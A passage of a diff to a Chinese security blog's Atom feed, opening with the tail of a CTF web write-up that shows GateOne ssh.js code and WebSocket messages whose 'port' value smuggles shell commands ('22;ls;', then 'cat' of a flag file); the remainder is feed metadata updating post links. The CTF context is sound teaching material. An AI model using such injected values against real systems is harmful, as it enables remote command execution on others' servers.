class="symbol">'terminal</span>:ssh_get_private_key': get_private_key,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_get_host_fingerprint': get_host_fingerprint,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_gen_new_keypair': generate_new_keypair,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_store_id_file': store_id_file,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_delete_identity': delete_identity,</span><br><span class="line">        <span class="symbol">'terminal</span>:ssh_set_default_identities': set_default_identities,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="symbol">'Escape'</span>: opt_esc_handler,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#ssh.js</span><br><span class="line">.....</span><br><span class="line">var document = window.document, <span class="comment">// Have to do this because we're sandboxed</span></span><br><span class="line">    go = GateOne,</span><br><span class="line">    prefix = go.prefs.prefix,</span><br><span class="line">    u = go.Utils,</span><br><span class="line">    v = go.Visual,</span><br><span class="line">    E = go.Events,</span><br><span class="line">    t = go.Terminal,</span><br><span class="line">    gettext = go.i18n.gettext,</span><br><span class="line">    urlObj = (window.URL<span class="operator"> || </span>window.webkitURL),</span><br><span class="line">    logFatal = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logFatal,</span><br><span class="line">    logError = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logError,</span><br><span class="line">    logWarning = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logWarning,</span><br><span class="line">    logInfo = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logInfo,</span><br><span class="line">    logDebug = <span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span><span class="module"><span class="identifier">Logging</span>.</span></span>logDebug;</span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line">    handleConnect: <span class="keyword">function</span>(connectString) &#123;</span><br><span class="line">        <span class="comment">/**:GateOne.SSH.handleConnect(connectString)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Handles the `terminal:sshjs_connect` WebSocket action which should provide an SSH *connectString* in the form of 'user@host:port'.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        The *connectString* will be stored in `GateOne.Terminal.terminals[term]['sshConnectString']` which is meant to be used in duplicating terminals (because you can't rely on the title).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Also requests the host's public SSH key so it can be displayed to the user.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        log<span class="constructor">Debug('<span class="params">sshjs_connect</span>: ' + <span class="params">connectString</span>)</span>;</span><br><span class="line">        var host = connectString.split(<span class="character">'@'</span>)<span class="literal">[<span class="number">1</span>]</span>.split(<span class="character">':'</span>)<span class="literal">[<span class="number">0</span>]</span>,</span><br><span class="line">            port = connectString.split(<span class="character">'@'</span>)<span class="literal">[<span class="number">1</span>]</span>.split(<span class="character">':'</span>)<span class="literal">[<span class="number">1</span>]</span>,</span><br><span class="line">            message = &#123;'host': host, 'port': port&#125;,</span><br><span class="line">            term = localStorage<span class="literal">[<span class="identifier">prefix</span>+'<span class="identifier">selectedTerminal</span>']</span>;</span><br><span class="line">        t.terminals<span class="literal">[<span class="identifier">term</span>]</span><span class="literal">['<span class="identifier">sshConnectString</span>']</span> = connectString;</span><br><span class="line">        go.ws.send(<span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>stringify(&#123;'terminal:ssh_get_host_fingerprint': message&#125;));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以可以知道是通过GateOne来发送WebSocket，从而触发执行。所以我们可以自己构造 go.ws.send(JSON.stringify({‘terminal:ssh_get_host_fingerprint’: message}));语句，通过port来进行命令拼接，从而实现在终端上执行任意命令。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span></span>ws.send('&#123;<span class="string">"terminal:ssh_get_host_fingerprint"</span>:&#123;<span class="string">"host"</span>:<span class="string">"[ip]"</span>,<span class="string">"port"</span>:<span class="string">"22;ls;"</span>&#125;&#125;')</span><br></pre></td></tr></table></figure><p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-6876a862944ce0a9.png" alt></p><p>列出了网站的根目录</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin   dev  gateone  lib    media  opt                <span class="keyword">proc</span><span class="title">  run</span> <span class="title">  srv</span> <span class="title"> tmp</span> <span class="title"> var</span></span><br><span class="line"><span class="title">boot</span> <span class="title"> etc</span> <span class="title"> home</span> <span class="title">    lib64</span> <span class="title"> mnt</span> <span class="title">   ppppp_f_l_4_g_mmm</span> <span class="title"> root</span> <span class="title"> sbin</span> <span class="title"> sys</span> <span class="title"> usr</span></span><br></pre></td></tr></table></figure><p>所以拼接一下cat /ppppp_f_l_4_g_mmm文件的命令就可以拿到flag了</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">GateOne</span>.</span></span>ws.send('&#123;<span class="string">"terminal:ssh_get_host_fingerprint"</span>:&#123;<span class="string">"host"</span>:<span class="string">"[ip]"</span>,<span class="string">"port"</span>:<span class="string">"22;cat /ppppp_f_l_4_g_mmm;"</span>&#125;&#125;')</span><br></pre></td></tr></table></figure><p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-83b114f6f3a64a5d.png" alt></p><h3 id="0x05-render"><a href="#0x05-render" class="headerlink" title="0x05 render"></a>0x05 render</h3><p>Thymeleaf Spring EL SSTI  后面补上</p>]]></content>
     
@@ -136,25 +136,25 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
     
-      <category term="XXE" scheme="http://yoursite.com/tags/XXE/"/>
+      <category term="XXE" scheme="https://cyc1e183.github.io/tags/XXE/"/>
     
-      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
+      <category term="RCE" scheme="https://cyc1e183.github.io/tags/RCE/"/>
     
-      <category term="telnet" scheme="http://yoursite.com/tags/telnet/"/>
+      <category term="telnet" scheme="https://cyc1e183.github.io/tags/telnet/"/>
     
-      <category term=".user.ini" scheme="http://yoursite.com/tags/user-ini/"/>
+      <category term=".user.ini" scheme="https://cyc1e183.github.io/tags/user-ini/"/>
     
   </entry>
   
   <entry>
     <title>2019 Xnuca_Ezphp WP</title>
-    <link href="http://yoursite.com/2019/08/25/2019-Xnuca-Ezphp-WP/"/>
-    <id>http://yoursite.com/2019/08/25/2019-Xnuca-Ezphp-WP/</id>
+    <link href="https://cyc1e183.github.io/2019/08/25/2019-Xnuca-Ezphp-WP/"/>
+    <id>https://cyc1e183.github.io/2019/08/25/2019-Xnuca-Ezphp-WP/</id>
     <published>2019-08-25T03:00:47.000Z</published>
     <updated>2020-03-05T10:59:24.949Z</updated>
     
@@ -168,17 +168,17 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
     
   </entry>
   
   <entry>
     <title>2019 SUCTF Web writeup</title>
-    <link href="http://yoursite.com/2019/08/19/2019-SUCTF-Web-writeup/"/>
-    <id>http://yoursite.com/2019/08/19/2019-SUCTF-Web-writeup/</id>
+    <link href="https://cyc1e183.github.io/2019/08/19/2019-SUCTF-Web-writeup/"/>
+    <id>https://cyc1e183.github.io/2019/08/19/2019-SUCTF-Web-writeup/</id>
     <published>2019-08-19T05:15:35.000Z</published>
     <updated>2020-03-05T10:59:24.938Z</updated>
     
@@ -192,21 +192,21 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
     
-      <category term=".htaccess" scheme="http://yoursite.com/tags/htaccess/"/>
+      <category term=".htaccess" scheme="https://cyc1e183.github.io/tags/htaccess/"/>
     
-      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
+      <category term="SQL" scheme="https://cyc1e183.github.io/tags/SQL/"/>
     
   </entry>
   
   <entry>
     <title>中关村第三届新兴领域专题赛网络与信息安全领域专项赛Web_WP</title>
-    <link href="http://yoursite.com/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/"/>
-    <id>http://yoursite.com/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/</id>
+    <link href="https://cyc1e183.github.io/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/"/>
+    <id>https://cyc1e183.github.io/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/</id>
     <published>2019-08-15T12:33:04.000Z</published>
     <updated>2020-03-05T10:59:24.949Z</updated>
     
@@ -219,19 +219,19 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
     
-      <category term="XXE" scheme="http://yoursite.com/tags/XXE/"/>
+      <category term="XXE" scheme="https://cyc1e183.github.io/tags/XXE/"/>
     
   </entry>
   
   <entry>
     <title>2019 De1CTF Web_wp</title>
-    <link href="http://yoursite.com/2019/08/05/2019-De1CTF-Web-wp/"/>
-    <id>http://yoursite.com/2019/08/05/2019-De1CTF-Web-wp/</id>
+    <link href="https://cyc1e183.github.io/2019/08/05/2019-De1CTF-Web-wp/"/>
+    <id>https://cyc1e183.github.io/2019/08/05/2019-De1CTF-Web-wp/</id>
     <published>2019-08-05T05:54:17.000Z</published>
     <updated>2020-03-20T07:32:17.388Z</updated>
     
@@ -244,21 +244,21 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
     
-      <category term="open_basedir" scheme="http://yoursite.com/tags/open-basedir/"/>
+      <category term="open_basedir" scheme="https://cyc1e183.github.io/tags/open-basedir/"/>
     
-      <category term="SSRF" scheme="http://yoursite.com/tags/SSRF/"/>
+      <category term="SSRF" scheme="https://cyc1e183.github.io/tags/SSRF/"/>
     
   </entry>
   
   <entry>
     <title>Windows10搭建python2和python3、pip2和pip3共存环境搭建</title>
-    <link href="http://yoursite.com/2019/08/04/Windows10%E6%90%AD%E5%BB%BApython2%E5%92%8Cpython3%E3%80%81pip2%E5%92%8Cpip3%E5%85%B1%E5%AD%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
-    <id>http://yoursite.com/2019/08/04/Windows10%E6%90%AD%E5%BB%BApython2%E5%92%8Cpython3%E3%80%81pip2%E5%92%8Cpip3%E5%85%B1%E5%AD%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
+    <link href="https://cyc1e183.github.io/2019/08/04/Windows10%E6%90%AD%E5%BB%BApython2%E5%92%8Cpython3%E3%80%81pip2%E5%92%8Cpip3%E5%85%B1%E5%AD%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
+    <id>https://cyc1e183.github.io/2019/08/04/Windows10%E6%90%AD%E5%BB%BApython2%E5%92%8Cpython3%E3%80%81pip2%E5%92%8Cpip3%E5%85%B1%E5%AD%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
     <published>2019-08-04T02:15:54.000Z</published>
     <updated>2020-03-04T12:05:30.742Z</updated>
     
@@ -272,17 +272,17 @@
     </summary>
     
     
-      <category term="水滴随笔" scheme="http://yoursite.com/categories/%E6%B0%B4%E6%BB%B4%E9%9A%8F%E7%AC%94/"/>
+      <category term="水滴随笔" scheme="https://cyc1e183.github.io/categories/%E6%B0%B4%E6%BB%B4%E9%9A%8F%E7%AC%94/"/>
     
     
-      <category term="环境搭建" scheme="http://yoursite.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
+      <category term="环境搭建" scheme="https://cyc1e183.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
     
   </entry>
   
   <entry>
     <title>Linux 几种反弹shell方式</title>
-    <link href="http://yoursite.com/2019/08/02/Linux-%E5%87%A0%E7%A7%8D%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F/"/>
-    <id>http://yoursite.com/2019/08/02/Linux-%E5%87%A0%E7%A7%8D%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F/</id>
+    <link href="https://cyc1e183.github.io/2019/08/02/Linux-%E5%87%A0%E7%A7%8D%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F/"/>
+    <id>https://cyc1e183.github.io/2019/08/02/Linux-%E5%87%A0%E7%A7%8D%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F/</id>
     <published>2019-08-02T08:42:53.000Z</published>
     <updated>2020-03-04T12:08:05.592Z</updated>
     
@@ -296,19 +296,19 @@
     </summary>
     
     
-      <category term="水滴随笔" scheme="http://yoursite.com/categories/%E6%B0%B4%E6%BB%B4%E9%9A%8F%E7%AC%94/"/>
+      <category term="水滴随笔" scheme="https://cyc1e183.github.io/categories/%E6%B0%B4%E6%BB%B4%E9%9A%8F%E7%AC%94/"/>
     
     
-      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
+      <category term="Linux" scheme="https://cyc1e183.github.io/tags/Linux/"/>
     
-      <category term="反弹shell" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BC%B9shell/"/>
+      <category term="反弹shell" scheme="https://cyc1e183.github.io/tags/%E5%8F%8D%E5%BC%B9shell/"/>
     
   </entry>
   
   <entry>
     <title>BUUOJ Web练手记录</title>
-    <link href="http://yoursite.com/2019/08/01/BUUOJ-Web%E7%BB%83%E6%89%8B%E8%AE%B0%E5%BD%95/"/>
-    <id>http://yoursite.com/2019/08/01/BUUOJ-Web%E7%BB%83%E6%89%8B%E8%AE%B0%E5%BD%95/</id>
+    <link href="https://cyc1e183.github.io/2019/08/01/BUUOJ-Web%E7%BB%83%E6%89%8B%E8%AE%B0%E5%BD%95/"/>
+    <id>https://cyc1e183.github.io/2019/08/01/BUUOJ-Web%E7%BB%83%E6%89%8B%E8%AE%B0%E5%BD%95/</id>
     <published>2019-08-01T08:48:40.000Z</published>
     <updated>2020-03-05T10:59:24.941Z</updated>
     
@@ -322,17 +322,17 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
     
   </entry>
   
   <entry>
     <title>CVE-2019-13272 Linux本地提权漏洞复现</title>
-    <link href="http://yoursite.com/2019/07/31/CVE-2019-13272-Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://yoursite.com/2019/07/31/CVE-2019-13272-Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
+    <link href="https://cyc1e183.github.io/2019/07/31/CVE-2019-13272-Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://cyc1e183.github.io/2019/07/31/CVE-2019-13272-Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
     <published>2019-07-31T07:31:24.000Z</published>
     <updated>2020-03-04T12:10:52.367Z</updated>
     
@@ -345,21 +345,21 @@
     </summary>
     
     
-      <category term="水滴随笔" scheme="http://yoursite.com/categories/%E6%B0%B4%E6%BB%B4%E9%9A%8F%E7%AC%94/"/>
+      <category term="水滴随笔" scheme="https://cyc1e183.github.io/categories/%E6%B0%B4%E6%BB%B4%E9%9A%8F%E7%AC%94/"/>
     
     
-      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
+      <category term="CVE" scheme="https://cyc1e183.github.io/tags/CVE/"/>
     
-      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
+      <category term="提权" scheme="https://cyc1e183.github.io/tags/%E6%8F%90%E6%9D%83/"/>
     
-      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
+      <category term="Linux" scheme="https://cyc1e183.github.io/tags/Linux/"/>
     
   </entry>
   
   <entry>
     <title>Windows下 PHPstorm + Xdebug 动态调试环境配置</title>
-    <link href="http://yoursite.com/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
-    <id>http://yoursite.com/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
+    <link href="https://cyc1e183.github.io/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
+    <id>https://cyc1e183.github.io/2019/07/15/Windows%E4%B8%8B-PHPstorm-Xdebug-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
     <published>2019-07-15T03:38:16.000Z</published>
     <updated>2020-03-05T10:15:47.703Z</updated>
     
@@ -373,17 +373,17 @@
     </summary>
     
     
-      <category term="水滴随笔" scheme="http://yoursite.com/categories/%E6%B0%B4%E6%BB%B4%E9%9A%8F%E7%AC%94/"/>
+      <category term="水滴随笔" scheme="https://cyc1e183.github.io/categories/%E6%B0%B4%E6%BB%B4%E9%9A%8F%E7%AC%94/"/>
     
     
-      <category term="环境搭建" scheme="http://yoursite.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
+      <category term="环境搭建" scheme="https://cyc1e183.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
     
   </entry>
   
   <entry>
     <title>Discuz ML V3.x 代码注入漏洞详细分析</title>
-    <link href="http://yoursite.com/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</id>
+    <link href="https://cyc1e183.github.io/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
+    <id>https://cyc1e183.github.io/2019/07/13/Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</id>
     <published>2019-07-13T03:12:44.000Z</published>
     <updated>2020-03-04T11:47:41.775Z</updated>
     
@@ -396,19 +396,19 @@
     </summary>
     
     
-      <category term="Cyc1e的漏洞分析之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的漏洞分析之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
+      <category term="CVE" scheme="https://cyc1e183.github.io/tags/CVE/"/>
     
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <category term="代码审计" scheme="https://cyc1e183.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
   <entry>
     <title>强网杯决赛RW的3个Web题</title>
-    <link href="http://yoursite.com/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/"/>
-    <id>http://yoursite.com/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/</id>
+    <link href="https://cyc1e183.github.io/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/"/>
+    <id>https://cyc1e183.github.io/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/</id>
     <published>2019-06-16T14:22:41.000Z</published>
     <updated>2020-03-09T11:14:01.227Z</updated>
     
@@ -422,19 +422,19 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <category term="代码审计" scheme="https://cyc1e183.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="RealWorld" scheme="http://yoursite.com/tags/RealWorld/"/>
+      <category term="RealWorld" scheme="https://cyc1e183.github.io/tags/RealWorld/"/>
     
   </entry>
   
   <entry>
     <title>2019 强网杯部分Web题及解题思路</title>
-    <link href="http://yoursite.com/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
-    <id>http://yoursite.com/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</id>
+    <link href="https://cyc1e183.github.io/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
+    <id>https://cyc1e183.github.io/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</id>
     <published>2019-05-31T01:09:19.000Z</published>
     <updated>2020-03-05T10:59:24.938Z</updated>
     
@@ -447,23 +447,23 @@
     </summary>
     
     
-      <category term="Cyc1e的CTF之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
+      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
     
     
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
     
-      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
+      <category term="SQL" scheme="https://cyc1e183.github.io/tags/SQL/"/>
     
-      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+      <category term="反序列化" scheme="https://cyc1e183.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     
-      <category term="uwsgi" scheme="http://yoursite.com/tags/uwsgi/"/>
+      <category term="uwsgi" scheme="https://cyc1e183.github.io/tags/uwsgi/"/>
     
   </entry>
   
   <entry>
     <title>2019 全国大学生信息安全竞赛创新能力实践赛3道Web Writeup</title>
-    <link href="http://yoursite.com/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/"/>
